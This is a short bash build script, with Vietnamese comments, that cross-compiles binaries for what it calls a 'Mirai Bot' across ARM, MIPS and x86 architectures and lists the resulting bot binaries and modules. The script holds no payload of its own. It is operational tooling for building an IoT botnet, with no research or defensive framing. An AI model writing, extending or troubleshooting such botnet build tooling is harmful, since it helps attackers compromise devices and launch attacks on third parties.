#!/bin/bash
# build_bot.sh — Cross-compile bot binary cho tất cả kiến trúc
# Yêu cầu: cross-compile toolchains cho từng kiến trúc
#
# Toolchains cần cài (tuỳ hệ điều hành):
#   Debian/Ubuntu: apt install g++-aarch64-linux-gnu g++-arm-linux-gnueabihf g++-i686-linux-gnu g++-mips-linux-gnu g++-mipsel-linux-gnu
#   Termux:        pkg install binutils (chỉ build được native)
#   Alpine:        apk add g++-aarch64-linux-gnu ...

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
BOT_DIR="$PROJECT_DIR/bot"

echo "=== Building Mirai Bot Binaries ==="
echo "Project: $PROJECT_DIR"
echo ""

cd "$BOT_DIR"

# Native build (luôn build được)
echo "[*] Building native..."
make clean all TARGET=native 2>&1 | tail -3
echo "[+] Native build done"
echo ""

# Cross-compile cho từng kiến trúc (bỏ qua nếu không có toolchain)
ARCHS=("aarch64" "arm" "x86_64" "x86" "mips" "mipsel")

for arch in "${ARCHS[@]}"; do
    echo "[*] Building $arch..."
    if make TARGET="$arch" 2>/dev/null; then
        echo "[+] $arch build done"
    else
        echo "[!] $arch skipped (toolchain not available)"
    fi
    echo ""
done

echo "=== Build complete ==="
echo "Binaries:"
ls -lh "$PROJECT_DIR/dist/" 2>/dev/null
echo ""
echo "Modules:"
ls -lh "$PROJECT_DIR/dist/modules/" 2>/dev/null
